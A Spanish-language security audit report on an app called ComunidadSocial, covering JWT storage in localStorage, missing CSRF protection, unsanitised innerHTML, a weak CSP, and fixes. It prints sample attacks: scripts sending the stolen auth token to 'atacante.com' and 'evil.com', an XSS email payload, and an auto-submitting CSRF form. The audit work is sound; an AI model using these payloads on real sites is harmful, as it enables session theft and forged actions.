# REPORTE DE SEGURIDAD: Autenticación JWT y Vulnerabilidades XSS/CSRF

## Sistema ComunidadSocial - Auditoría de Seguridad

**Fecha:** Enero 2026
**Versión:** 1.0
**Alcance:** Sistema completo de autenticación, almacenamiento de tokens, y vulnerabilidades XSS/CSRF

---

# ÍNDICE

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Arquitectura de Autenticación](#2-arquitectura-de-autenticación)
3. [Análisis del Backend](#3-análisis-del-backend)
4. [Análisis del Frontend](#4-análisis-del-frontend)
5. [Vulnerabilidades XSS](#5-vulnerabilidades-xss)
6. [Protección CSRF](#6-protección-csrf)
7. [Headers de Seguridad](#7-headers-de-seguridad)
8. [Matriz de Vulnerabilidades](#8-matriz-de-vulnerabilidades)
9. [Recomendaciones](#9-recomendaciones)

---

# 1. RESUMEN EJECUTIVO

## 1.1 Estado General

| Aspecto | Estado | Riesgo |
|---------|--------|--------|
| JWT en HttpOnly Cookie | ✅ Implementado | Bajo |
| JWT en localStorage | ⚠️ VULNERABLE | **ALTO** |
| Rate Limiting | ✅ Implementado | Bajo |
| Validación Zod | ✅ Parcial | Medio |
| Protección CSRF | ❌ NO EXISTE | **CRÍTICO** |
| Sanitización XSS | ⚠️ Inconsistente | **ALTO** |
| Headers Seguridad | ✅ Implementado | Bajo |
| CSP | ⚠️ Débil (unsafe-inline) | **ALTO** |

## 1.2 Hallazgos Críticos

```
┌─────────────────────────────────────────────────────────────────┐
│  CRÍTICO: Token JWT almacenado en localStorage                  │
│  ─────────────────────────────────────────────────────────────  │
│  Cualquier script XSS puede robar el token:                     │
│                                                                 │
│  localStorage.getItem('auth_token')  // Token expuesto          │
│  localStorage.getItem('currentUser') // Datos del usuario       │
│                                                                 │
│  Impacto: Robo de sesión completo                               │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│  CRÍTICO: Sin protección CSRF                                   │
│  ─────────────────────────────────────────────────────────────  │
│  No hay tokens CSRF en formularios POST/PUT/DELETE              │
│                                                                 │
│  Impacto: Ataques de falsificación de solicitudes               │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│  ALTO: 200+ usos de innerHTML sin sanitización                  │
│  ─────────────────────────────────────────────────────────────  │
│  Datos de usuarios insertados directamente en HTML              │
│                                                                 │
│  Impacto: Inyección de scripts maliciosos                       │
└─────────────────────────────────────────────────────────────────┘
```

---

# 2. ARQUITECTURA DE AUTENTICACIÓN

## 2.1 Flujo Actual

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          FLUJO DE AUTENTICACIÓN                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────┐         ┌──────────────┐         ┌──────────────┐            │
│  │ USUARIO  │────────►│ POST /login  │────────►│   BACKEND    │            │
│  └──────────┘         └──────────────┘         └──────┬───────┘            │
│                                                       │                     │
│                              ┌────────────────────────┴─────────────────┐   │
│                              │                                          │   │
│                              ▼                                          ▼   │
│                    ┌─────────────────┐                      ┌───────────────┐
│                    │ Set-Cookie:     │                      │ Response Body │
│                    │ auth_token=JWT  │                      │ { token: JWT }│
│                    │ HttpOnly=true   │                      │               │
│                    │ Secure=true     │                      │ ⚠️ REDUNDANTE │
│                    │ SameSite=strict │                      └───────┬───────┘
│                    └────────┬────────┘                              │        │
│                             │                                       │        │
│                             ▼                                       ▼        │
│                    ┌─────────────────┐                   ┌─────────────────┐ │
│                    │ Cookie Storage  │                   │ localStorage    │ │
│                    │ (SEGURO)        │                   │ (VULNERABLE)    │ │
│                    │ No accesible JS │                   │ Accesible JS    │ │
│                    └─────────────────┘                   └─────────────────┘ │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                          REQUEST AUTENTICADO                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────┐                                           ┌──────────────┐   │
│  │ BROWSER  │──── Cookie: auth_token=JWT ──────────────►│   BACKEND    │   │
│  │          │──── Authorization: Bearer JWT ───────────►│              │   │
│  └──────────┘     (redundante)                          └──────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 2.2 Archivos Principales

| Componente | Archivo | Líneas Clave |
|------------|---------|--------------|
| Generación JWT | `server/middleware/auth.js` | 77-87 |
| Validación JWT | `server/middleware/auth.js` | 25-61 |
| Login Usuario | `server/routes/auth.js` | 53-89 |
| Login Ministro | `server/routes/ministros.js` | 185-220 |
| Cookie Config | `server/middleware/auth.js` | 16-23 |
| Frontend Token | `src/services/ApiService.js` | 37-47 |
| Headers Auth | `src/services/ApiService.js` | 61-73 |

---

# 3. ANÁLISIS DEL BACKEND

## 3.1 Generación del JWT

**Archivo:** `server/middleware/auth.js:77-87`

```javascript
export const generateToken = (user) => {
  return jwt.sign(
    {
      userId: user._id,
      email: user.email,
      role: user.role
    },
    EFFECTIVE_JWT_SECRET,
    { expiresIn: '7d' }
  );
};
```

| Aspecto | Valor | Evaluación |
|---------|-------|------------|
| Algoritmo | HS256 (default) | ✅ Aceptable |
| Expiración | 7 días | ⚠️ Largo sin refresh |
| Payload | userId, email, role | ✅ Mínimo necesario |
| Secret | Env variable | ✅ Correcto |

## 3.2 Configuración de Cookies

**Archivo:** `server/middleware/auth.js:16-23`

```javascript
export const COOKIE_OPTIONS = {
  httpOnly: true,           // ✅ No accesible desde JS
  secure: process.env.NODE_ENV === 'production',  // ✅ Solo HTTPS en prod
  sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax',
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 días
  path: '/'
};
```

| Opción | Valor | Propósito |
|--------|-------|-----------|
| `httpOnly` | `true` | Previene acceso JavaScript (XSS) |
| `secure` | `true` (prod) | Solo HTTPS |
| `sameSite` | `strict` (prod) | Previene CSRF básico |
| `maxAge` | 604,800,000 ms | Sincronizado con JWT |

## 3.3 Validación del Token

**Archivo:** `server/middleware/auth.js:25-61`

```javascript
export const authenticate = async (req, res, next) => {
  let token = null;

  // Prioridad 1: Cookie HttpOnly (método seguro)
  if (req.cookies && req.cookies.auth_token) {
    token = req.cookies.auth_token;
  }
  // Prioridad 2: Header Authorization (compatibilidad)
  else if (req.headers.authorization?.startsWith('Bearer ')) {
    token = req.headers.authorization.split(' ')[1];
  }

  if (!token) {
    return res.status(401).json({ error: 'Token de acceso requerido' });
  }

  const decoded = jwt.verify(token, EFFECTIVE_JWT_SECRET);
  const user = await User.findById(decoded.userId);

  if (!user || !user.active) {
    return res.status(401).json({ error: 'Usuario no válido o inactivo' });
  }

  req.user = user;
  req.userId = user._id;
  next();
};
```

**Proceso de Validación:**
1. Busca token en cookie (prioridad)
2. Fallback a header Authorization
3. Verifica firma y expiración JWT
4. Valida usuario existe y está activo en BD
5. Adjunta usuario al request

## 3.4 Rate Limiting

**Archivo:** `server/middleware/security.js`

| Endpoint | Limiter | Ventana | Máximo | Clave |
|----------|---------|---------|--------|-------|
| `/api/*` | `generalLimiter` | 1 min | 100 req | IP |
| `/api/auth/login` | `authLimiter` | 15 min | 5 intentos | IP + email |
| `/api/ministros/login` | `authLimiter` | 15 min | 5 intentos | IP + email |
| `/api/auth/register` | `registerLimiter` | 1 hora | 3 registros | IP |
| `/api/auth/change-password` | `sensitiveLimiter` | 1 hora | 3 intentos | IP |

```javascript
// authLimiter - Solo cuenta intentos FALLIDOS
export const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,       // 15 minutos
  max: 5,                         // 5 intentos
  skipSuccessfulRequests: true,   // ✅ Logins exitosos no consumen
  keyGenerator: (req) => {
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0];
    const email = req.body?.email || '';
    return `${ip}-${email}`;      // IP + email como clave
  }
});
```

## 3.5 Hashing de Contraseñas

**Archivo:** `server/models/User.js:112-121`

```javascript
// Pre-save hook
userSchema.pre('save', async function(next) {
  if (!this.isModified('password')) return next();
  this.password = await bcrypt.hash(this.password, 10);  // Salt rounds: 10
  next();
});

// Comparación
userSchema.methods.comparePassword = async function(candidatePassword) {
  return bcrypt.compare(candidatePassword, this.password);
};
```

| Aspecto | Valor | Evaluación |
|---------|-------|------------|
| Librería | bcryptjs | ✅ Estándar |
| Salt rounds | 10 | ✅ Balance seguridad/performance |
| Timing-safe | Sí (bcrypt.compare) | ✅ Previene timing attacks |

---

# 4. ANÁLISIS DEL FRONTEND

## 4.1 Almacenamiento del Token

### PROBLEMA CRÍTICO: Doble almacenamiento

**Archivo:** `src/services/ApiService.js:37-47`

```javascript
getToken() {
  return localStorage.getItem('auth_token');  // ⚠️ VULNERABLE A XSS
}

setToken(token) {
  localStorage.setItem('auth_token', token);  // ⚠️ VULNERABLE A XSS
}

removeToken() {
  localStorage.removeItem('auth_token');
}
```

**Datos en localStorage (TODOS vulnerables a XSS):**

| Key | Contenido | Riesgo |
|-----|-----------|--------|
| `auth_token` | JWT completo | **CRÍTICO** - Robo de sesión |
| `currentUser` | Objeto usuario JSON | **ALTO** - Datos personales |
| `currentMinistro` | Objeto ministro JSON | **ALTO** - Datos personales |
| `isAuthenticated` | Boolean | Bajo |
| `user_organizations` | Array organizaciones | Medio |

### Demostración de vulnerabilidad:

```javascript
// Un atacante con XSS puede ejecutar:
const token = localStorage.getItem('auth_token');
const user = JSON.parse(localStorage.getItem('currentUser'));

// Enviar a servidor malicioso
fetch('https://atacante.com/robar', {
  method: 'POST',
  body: JSON.stringify({ token, user })
});

// El atacante ahora puede:
// 1. Suplantar al usuario por 7 días
// 2. Acceder a todas sus organizaciones
// 3. Modificar datos en su nombre
```

## 4.2 Envío del Token en Requests

**Archivo:** `src/services/ApiService.js:61-105`

```javascript
getHeaders() {
  const headers = { 'Content-Type': 'application/json' };

  // ⚠️ REDUNDANTE: Token ya va en cookie
  const token = this.getToken();
  if (token) {
    headers['Authorization'] = `Bearer ${token}`;
  }
  return headers;
}

async request(endpoint, options = {}) {
  const config = {
    headers: this.getHeaders(),
    credentials: 'include',  // ✅ Envía cookies automáticamente
    ...options
  };
  // ...
}
```

**Problema:** El token se envía DOS veces:
1. En cookie HttpOnly (automático, seguro)
2. En header Authorization (manual, desde localStorage vulnerable)

## 4.3 Manejo de Token Expirado

**Estado: INCOMPLETO**

```javascript
// auth.js - NO hay manejo de "Token expirado"
} catch (error) {
  console.error('Login error:', error);

  if (error.message.includes('no encontrado') ||
      error.message.includes('Credenciales inválidas')) {
    showError('login-email', 'Correo o contraseña incorrectos');
  }
  // ❌ NO MANEJA: error.message.includes('Token expirado')
  // ❌ NO REDIRIGE: a página de login
}
```

**Consecuencias:**
- Usuario ve error genérico
- No es redirigido a login
- Token inválido permanece en localStorage

## 4.4 Logout Incompleto

**Archivo:** `main.js:248-271`

```javascript
logoutBtn.addEventListener('click', async () => {
  notificationService.stopPolling();
  await apiService.logout();

  // Limpia ALGUNOS items:
  localStorage.removeItem('isAuthenticated');
  localStorage.removeItem('user_organizations');
  localStorage.removeItem('ministros_fe');

  // ❌ NO LIMPIA:
  // - 'auth_token'      (crítico)
  // - 'currentUser'     (datos personales)
  // - 'currentMinistro' (datos personales)

  window.location.href = '/auth.html';
});
```

**Archivo:** `src/services/ApiService.js:161-171`

```javascript
async logout() {
  try {
    await this.post('/auth/logout');  // Limpia cookie en servidor
  } catch (error) {
    console.warn('Logout endpoint error:', error);
  }
  // Limpia localStorage:
  this.removeToken();                          // ✅ auth_token
  localStorage.removeItem('currentUser');      // ✅ currentUser
  localStorage.removeItem('currentMinistro');  // ✅ currentMinistro
}
```

**Problema:** `apiService.logout()` limpia los items, pero `main.js` hace limpieza adicional incompleta que puede causar condiciones de carrera.

---

# 5. VULNERABILIDADES XSS

## 5.1 DOMPurify - Configuración

**Archivo:** `src/shared/utils/sanitize.js`

La librería está **correctamente configurada** con 3 niveles:

```javascript
// STRICT - Sin HTML
export const sanitizeText = (text) => {
  return DOMPurify.sanitize(text, { ALLOWED_TAGS: [] });
};

// RICH_TEXT - HTML limitado (p, br, b, i, ul, ol, a, etc.)
export const sanitizeRichText = (html) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'strong', 'em', 'span',
                   'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li',
                   'a', 'blockquote', 'pre', 'code'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    FORBID_TAGS: ['script', 'style', 'iframe', 'form', 'input',
                  'button', 'object', 'embed'],
    FORBID_ATTR: ['onclick', 'onerror', 'onload', 'onmouseover']
  });
};

// TEXT_ONLY - Solo texto plano
export const sanitizeStrict = (text) => {
  return DOMPurify.sanitize(text, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
};

// Escape HTML entities
export const escapeHtml = (text) => {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
};
```

## 5.2 Uso CORRECTO (Ejemplo)

**Archivo:** `src/presentation/news/NewsManager.js:237-263`

```javascript
// ✅ CORRECTO - Sanitización antes de insertar
const safeTitle = sanitizeText(article.title);
const safeContentHTML = sanitizeRichText(article.contentHTML);
const safeAuthorFirst = sanitizeText(article.author.firstName);

this.articleContent.innerHTML = `
  <img src="${escapeHtml(article.featuredImage)}" alt="${safeTitle}">
  <h1 class="article-title">${safeTitle}</h1>
  <div class="article-body">${safeContentHTML}</div>
`;
```

## 5.3 Uso INCORRECTO (Vulnerabilidades)

### VUL-XSS-001: Miembros sin sanitizar

**Archivo:** `WizardController.js:1727-1756`

```javascript
// ❌ VULNERABLE - Datos de usuario directamente en HTML
listContainer.innerHTML = this.formData.members.map((member, index) => {
  const fullName = `${member.primerNombre} ${member.segundoNombre}`;
  return `
    <div class="member-card">
      <div class="member-name">${fullName}</div>      <!-- XSS -->
      <div class="member-detail-item">${member.rut}</div>  <!-- XSS -->
      <span>${member.email}</span>                    <!-- XSS -->
      <span>${member.phone}</span>                    <!-- XSS -->
    </div>
  `;
}).join('');
```

**Explotación:**
```javascript
// Si un miembro tiene nombre:
{ primerNombre: '<img src=x onerror="fetch(\'https://evil.com/steal?token=\'+localStorage.getItem(\'auth_token\'))">' }

// El script se ejecutará y robará el token
```

### VUL-XSS-002: Comisión Electoral sin sanitizar

**Archivo:** `WizardController.js:2815-2830`

```javascript
// ❌ VULNERABLE
listContainer.innerHTML = commission.map((member, index) => `
  <div class="commission-member-display-card">
    <div class="member-name">${member.firstName} ${member.lastName}</div>
    <div class="member-rut">${member.rut || 'RUT no registrado'}</div>
  </div>
`).join('');
```

### VUL-XSS-003: Ministros en selector

**Archivo:** `WizardController.js:4892-4901`

```javascript
// ❌ VULNERABLE
ministroSelect.innerHTML = `
  <option value="">-- Seleccionar --</option>
  ${availableMinistros.map(ministro => `
    <option value="${ministro._id}">
      ${ministro.firstName} ${ministro.lastName} - ${ministro.rut}
    </option>
  `).join('')}
`;
```

### VUL-XSS-004: document.write sin sanitizar

**Archivo:** `AdminDashboard.js:2457`

```javascript
// ❌ VULNERABLE
const printWindow = window.open('', '_blank');
printWindow.document.write(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>${docNames[docType]} - ${getOrgName(org)}</title>
    ...
`);
```

### VUL-XSS-005: Mensajes de error

**Archivo:** `src/shared/utils/formHelpers.js:453`

```javascript
// ❌ VULNERABLE - Si messages contiene HTML
errorEl.innerHTML = messages.map(m => `<span>${m}</span>`).join('');
```

### VUL-XSS-006: Email en recuperación

**Archivo:** `auth.js:431-438`

```javascript
// ❌ VULNERABLE
passwordResult.innerHTML = `
  <p>Proporciona tu email registrado: <strong>${email}</strong></p>
`;
// Si email = 'test@x.com"><script>alert(1)</script>'
```

### VUL-XSS-007: Organizaciones en selector

**Archivo:** `migrate-directorio.html:123-125`

```javascript
// ❌ VULNERABLE
organizations.forEach(org => {
  select.innerHTML += `<option value="${org._id}">${org.organizationName}</option>`;
});
```

## 5.4 Resumen de Vulnerabilidades XSS

| ID | Archivo | Línea | Dato Vulnerable | Severidad |
|----|---------|-------|-----------------|-----------|
| XSS-001 | WizardController.js | 1727 | Nombres miembros | **ALTA** |
| XSS-002 | WizardController.js | 2815 | Comisión electoral | **ALTA** |
| XSS-003 | WizardController.js | 4892 | Nombres ministros | **ALTA** |
| XSS-004 | AdminDashboard.js | 2457 | Título documento | **MEDIA** |
| XSS-005 | formHelpers.js | 453 | Mensajes error | **MEDIA** |
| XSS-006 | auth.js | 437 | Email usuario | **BAJA** |
| XSS-007 | migrate-directorio.html | 125 | Nombre org | **MEDIA** |

---

# 6. PROTECCIÓN CSRF

## 6.1 Estado Actual: NO IMPLEMENTADA

**Búsqueda realizada:**
- `csrf`, `CSRF`, `csurf` en servidor: **SIN RESULTADOS**
- `_token`, `csrf-token` en templates: **SIN RESULTADOS**

## 6.2 Mitigación Parcial

El sistema tiene mitigación **parcial** mediante:

```javascript
// server/middleware/auth.js:16-23
sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax'
```

`SameSite=strict` previene que la cookie se envíe en requests cross-origin, pero:

1. **No protege contra subdominios maliciosos**
2. **No protege si hay XSS** (el atacante puede hacer requests desde el mismo origen)
3. **No es defensa en profundidad**

## 6.3 Endpoints Vulnerables

| Método | Endpoint | Acción | Riesgo CSRF |
|--------|----------|--------|-------------|
| POST | `/api/organizations` | Crear org | **ALTO** |
| PUT | `/api/organizations/:id` | Modificar org | **ALTO** |
| POST | `/api/organizations/:id/status` | Cambiar estado | **ALTO** |
| POST | `/api/organizations/:id/reject` | Rechazar | **ALTO** |
| POST | `/api/auth/change-password` | Cambiar contraseña | **CRÍTICO** |
| DELETE | `/api/ministros/:id` | Eliminar ministro | **ALTO** |

## 6.4 Ejemplo de Ataque

```html
<!-- Página maliciosa: atacante.com/trampa.html -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://comunidadsocial.vercel.app/api/organizations" method="POST">
    <input type="hidden" name="organizationName" value="Organización Fraudulenta">
    <input type="hidden" name="organizationType" value="JUNTA_VECINOS">
    <input type="hidden" name="address" value="Dirección Falsa">
  </form>
</body>
</html>

<!-- Si un usuario autenticado visita esta página,
     se creará una organización sin su consentimiento -->
```

---

# 7. HEADERS DE SEGURIDAD

## 7.1 Configuración Helmet

**Archivo:** `server/middleware/security.js:96-127`

```javascript
export const securityHeaders = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.quilljs.com"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://cdn.quilljs.com",
                 "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "blob:", "https:"],
      connectSrc: ["'self'", "https://comunidadsocial-production.up.railway.app",
                   "https://*.vercel.app"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null
    }
  },
  frameguard: { action: 'deny' },
  noSniff: true,
  xssFilter: true,
  hidePoweredBy: true,
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
});
```

## 7.2 Evaluación de Headers

| Header | Valor | Estado | Notas |
|--------|-------|--------|-------|
| `X-Frame-Options` | `DENY` | ✅ | Previene clickjacking |
| `X-Content-Type-Options` | `nosniff` | ✅ | Previene MIME sniffing |
| `X-XSS-Protection` | `1; mode=block` | ✅ | Legacy pero útil |
| `Strict-Transport-Security` | `max-age=31536000` | ✅ | HSTS por 1 año |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | ✅ | Limita info referer |
| `Content-Security-Policy` | Ver arriba | ⚠️ | **DÉBIL** |

## 7.3 Problema con CSP

```javascript
scriptSrc: ["'self'", "'unsafe-inline'", ...]
styleSrc: ["'self'", "'unsafe-inline'", ...]
```

**`'unsafe-inline'` ANULA la protección XSS de CSP:**

- Permite `<script>alert('XSS')</script>` inline
- Permite `<div onclick="malicious()">`
- Permite `style="background:url('javascript:...')"`

**Razón probable:** Quill.js editor requiere estilos inline.

**Solución:** Usar nonces o hashes para scripts/estilos específicos.

## 7.4 Configuración CORS

**Archivo:** `server/index.js:38-63`

```javascript
const allowedOrigins = [
  'http://localhost:3000',
  'http://localhost:5173',
  'http://127.0.0.1:3000',
  'http://127.0.0.1:5173',
  'https://comunidad-social.vercel.app',
  'https://comunidadsocial.vercel.app'
];

app.use(cors({
  origin: function(origin, callback) {
    if (!origin) return callback(null, true);  // Permite requests sin origin
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.warn('CORS blocked origin:', origin);
      callback(new Error('No permitido por CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

| Aspecto | Estado | Notas |
|---------|--------|-------|
| Whitelist de orígenes | ✅ | Lista explícita |
| `credentials: true` | ✅ | Permite cookies |
| Métodos permitidos | ✅ | Solo los necesarios |
| Headers permitidos | ✅ | Content-Type, Authorization |

---

# 8. MATRIZ DE VULNERABILIDADES

## 8.1 Por Severidad

### CRÍTICAS (Requieren acción inmediata)

| ID | Vulnerabilidad | Ubicación | Impacto |
|----|----------------|-----------|---------|
| CRIT-001 | Token en localStorage | `ApiService.js:37-47` | Robo de sesión vía XSS |
| CRIT-002 | Sin protección CSRF | Todo el sistema | Acciones no autorizadas |
| CRIT-003 | innerHTML con datos usuario | `WizardController.js:1727` | Ejecución de código |

### ALTAS (Resolver en sprint actual)

| ID | Vulnerabilidad | Ubicación | Impacto |
|----|----------------|-----------|---------|
| HIGH-001 | CSP con unsafe-inline | `security.js:101-102` | XSS posible |
| HIGH-002 | Token enviado en body | `auth.js:79` | Token en logs/caché |
| HIGH-003 | innerHTML ministros | `WizardController.js:4892` | XSS |
| HIGH-004 | innerHTML comisión | `WizardController.js:2815` | XSS |
| HIGH-005 | Logout incompleto | `main.js:248-271` | Datos residuales |

### MEDIAS (Resolver próximo sprint)

| ID | Vulnerabilidad | Ubicación | Impacto |
|----|----------------|-----------|---------|
| MED-001 | Contraseña mínima 6 chars | `validation.js:36` | Fuerza bruta |
| MED-002 | Sin refresh tokens | N/A | UX degradada |
| MED-003 | Error messages XSS | `formHelpers.js:453` | XSS limitado |
| MED-004 | document.write XSS | `AdminDashboard.js:2457` | XSS en popup |

### BAJAS (Backlog)

| ID | Vulnerabilidad | Ubicación | Impacto |
|----|----------------|-----------|---------|
| LOW-001 | Sin 2FA/MFA | N/A | Cuenta comprometida |
| LOW-002 | Sin IP pinning | N/A | Token reutilizable |
| LOW-003 | Sin token revocation | N/A | Logout no invalida |

## 8.2 Resumen Visual

```
┌────────────────────────────────────────────────────────────────┐
│                    MATRIZ DE RIESGO                            │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  IMPACTO                                                       │
│    ▲                                                           │
│    │                                                           │
│  ALTO  │  MED-001      │  HIGH-001    │  CRIT-001  ●          │
│        │  MED-002      │  HIGH-002    │  CRIT-002  ●          │
│        │               │  HIGH-003    │  CRIT-003  ●          │
│        │               │  HIGH-004    │                        │
│        │               │  HIGH-005    │                        │
│  ──────┼───────────────┼──────────────┼────────────────────   │
│  MEDIO │  LOW-001      │  MED-003     │                        │
│        │  LOW-002      │  MED-004     │                        │
│        │  LOW-003      │              │                        │
│  ──────┼───────────────┼──────────────┼────────────────────   │
│  BAJO  │               │              │                        │
│        │               │              │                        │
│        └───────────────┴──────────────┴──────────────────►    │
│              BAJA           MEDIA           ALTA               │
│                        PROBABILIDAD                            │
│                                                                │
│  ● = Requiere acción inmediata                                 │
└────────────────────────────────────────────────────────────────┘
```

---

# 9. RECOMENDACIONES

## 9.1 Prioridad CRÍTICA (Implementar esta semana)

### R1: Eliminar token de localStorage

```javascript
// src/services/ApiService.js - ELIMINAR estos métodos
// getToken() { return localStorage.getItem('auth_token'); }
// setToken(token) { localStorage.setItem('auth_token', token); }

// El token SOLO debe existir en la cookie HttpOnly
// credentials: 'include' ya lo envía automáticamente
```

### R2: Eliminar token del body response

```javascript
// server/routes/auth.js - Cambiar respuestas
res.json({
  message: 'Inicio de sesión exitoso',
  user,
  // token,  // ← ELIMINAR esta línea
  mustChangePassword: user.mustChangePassword
});
```

### R3: Implementar protección CSRF

```bash
npm install csurf cookie-parser
```

```javascript
// server/index.js
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

// Aplicar a rutas que modifican datos
app.post('/api/organizations', authenticate, csrfProtection, ...);
app.put('/api/organizations/:id', authenticate, csrfProtection, ...);
app.post('/api/auth/change-password', authenticate, csrfProtection, ...);

// Endpoint para obtener token CSRF
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

### R4: Sanitizar todos los innerHTML

```javascript
// WizardController.js:1727 - CORREGIR
import { sanitizeText, escapeHtml } from '../../shared/utils/sanitize.js';

listContainer.innerHTML = this.formData.members.map((member, index) => {
  const safeName = sanitizeText(`${member.primerNombre} ${member.segundoNombre}`);
  const safeRut = escapeHtml(member.rut);
  const safeEmail = escapeHtml(member.email);
  const safePhone = escapeHtml(member.phone);

  return `
    <div class="member-card">
      <div class="member-name">${safeName}</div>
      <div class="member-detail-item">${safeRut}</div>
      <span>${safeEmail}</span>
      <span>${safePhone}</span>
    </div>
  `;
}).join('');
```

## 9.2 Prioridad ALTA (Próximas 2 semanas)

### R5: Mejorar CSP (eliminar unsafe-inline)

```javascript
// Opción 1: Usar nonces
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

contentSecurityPolicy: {
  directives: {
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
    styleSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
  }
}

// En HTML: <script nonce="{{nonce}}">...</script>
```

### R6: Aumentar requisitos de contraseña

```javascript
// server/middleware/validation.js
const passwordSchema = z.string()
  .min(12, 'La contraseña debe tener al menos 12 caracteres')  // ← Cambiar de 6 a 12
  .max(100)
  .regex(/[A-Z]/, 'Debe contener al menos una mayúscula')
  .regex(/[a-z]/, 'Debe contener al menos una minúscula')
  .regex(/[0-9]/, 'Debe contener al menos un número')
  .regex(/[^A-Za-z0-9]/, 'Debe contener al menos un carácter especial');
```

### R7: Implementar refresh tokens

```javascript
// Nuevo modelo: server/models/RefreshToken.js
const refreshTokenSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
  token: { type: String, required: true, unique: true },
  expiresAt: { type: Date, required: true },
  createdAt: { type: Date, default: Date.now }
});

// Nuevo endpoint: POST /api/auth/refresh
router.post('/refresh', async (req, res) => {
  const refreshToken = req.cookies.refresh_token;
  // Validar y generar nuevo access token
});
```

### R8: Completar logout

```javascript
// main.js - Logout completo
logoutBtn.addEventListener('click', async () => {
  // 1. Llamar endpoint logout (limpia cookie en servidor)
  await apiService.logout();

  // 2. Limpiar TODO localStorage
  localStorage.clear();  // ← Más seguro que items individuales

  // 3. Limpiar sessionStorage también
  sessionStorage.clear();

  // 4. Redirigir
  window.location.href = '/auth.html';
});
```

## 9.3 Prioridad MEDIA (Próximo mes)

### R9: Implementar 2FA/MFA

- Agregar TOTP (Google Authenticator)
- O SMS verification
- Especialmente para MUNICIPALIDAD y MINISTRO_FE

### R10: Token revocation list

```javascript
// Mantener lista de tokens invalidados en Redis/DB
const revokedTokens = new Set();

// En logout: agregar token a la lista
// En authenticate: verificar que token no esté revocado
```

### R11: Logging de seguridad

```javascript
// Registrar eventos de seguridad
- Intentos de login fallidos
- Cambios de contraseña
- Accesos desde nuevas IPs
- Tokens revocados
```

---

# 10. CHECKLIST DE IMPLEMENTACIÓN

## Fase 1: Crítico (Esta semana)

- [ ] Eliminar `getToken()` y `setToken()` de ApiService.js
- [ ] Eliminar `token` del body en responses de auth
- [ ] Limpiar todas las referencias a localStorage para auth_token
- [ ] Instalar y configurar csurf para CSRF
- [ ] Agregar endpoint `/api/csrf-token`
- [ ] Sanitizar innerHTML en WizardController.js (líneas 1727, 2815, 4892)

## Fase 2: Alta (Semanas 2-3)

- [ ] Sanitizar innerHTML en AdminDashboard.js
- [ ] Sanitizar innerHTML en formHelpers.js
- [ ] Sanitizar innerHTML en auth.js
- [ ] Mejorar CSP (remover unsafe-inline donde sea posible)
- [ ] Aumentar requisitos de contraseña a 12+ caracteres
- [ ] Completar logout para limpiar todo localStorage

## Fase 3: Media (Mes 2)

- [ ] Implementar refresh tokens
- [ ] Implementar 2FA para roles administrativos
- [ ] Agregar token revocation list
- [ ] Implementar logging de seguridad
- [ ] Agregar IP pinning opcional

---

**Fin del Reporte de Seguridad**

*Documento generado: Enero 2026*
*Próxima revisión recomendada: Marzo 2026*
